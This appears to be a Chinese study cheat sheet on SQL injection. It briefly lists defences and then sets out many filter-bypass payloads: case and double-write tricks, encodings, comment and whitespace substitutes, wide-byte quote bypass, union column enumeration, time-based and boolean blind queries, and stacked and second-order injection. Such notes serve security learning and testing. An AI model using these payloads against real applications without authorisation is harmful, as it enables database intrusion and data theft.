# SQL 注入：常见防御与绕过

## 1. 常见防御

- 过滤/转义单引号、双引号、`--`、`#`、`/**/`、`union`、`select`、`where` 等关键词
- 使用预编译（参数化查询）
- 限制输入类型与长度
- 报错信息脱敏

## 2. 绕过手段

### 关键词过滤

- **大小写/双写**：`UniOn SeLeCt`、`selselectect`
- **编码**：十六进制 `0x616263`、URL 编码、Unicode
- **注释分隔**：`sel/**/ect`、`u/**/nion`
- **换行符**：`%0a`、`%0d` 分隔关键词

### 引号与空格

- **数字型**：无引号直接 `id=1 and 1=1`
- **空格替代**：`%09`(tab)、`%0a`、`/**/`、`+`、括号包裹 `(select(1))`
- **引号绕过**：宽字节 `%df'`（GBK）、反斜杠转义

### 联合注入

- 用 `union select` 查列数：`order by n` 试出 n
- 用 `union select 1,2,...,列名` 回显位替代数字
- 若过滤 `information_schema`：可尝试 `mysql.innodb_table_stats` 等

### 布尔/时间盲注

- `and if(1,sleep(3),0)`、`and (select case when 1 then sleep(2) end)`
- 逐字符比较：`substr((select database()),1,1)='a'`

### 堆叠与二次注入

- 堆叠：`;` 后接另一条 SQL（依赖数据库与驱动支持）
- 二次：先写入带单引号等的数据，再在另一处拼接进 SQL 时触发
